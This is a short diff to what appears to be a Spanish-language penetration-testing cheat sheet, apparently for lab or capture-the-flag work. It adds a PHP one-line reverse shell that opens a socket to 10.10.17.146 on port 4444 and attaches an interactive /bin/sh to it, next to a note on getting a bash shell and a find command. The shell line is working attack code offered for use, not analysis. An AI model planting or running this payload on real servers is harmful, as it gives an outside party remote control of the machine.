@@ -12,6 +12,9 @@ lograr una bash:
 buscar un archivo en el entorno de docker:
 find / -name *.txt
 
+##############################################################PHP
+
+<?php $sock = fsockopen("10.10.17.146","4444"); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
 
 ############################################################## BASH
 
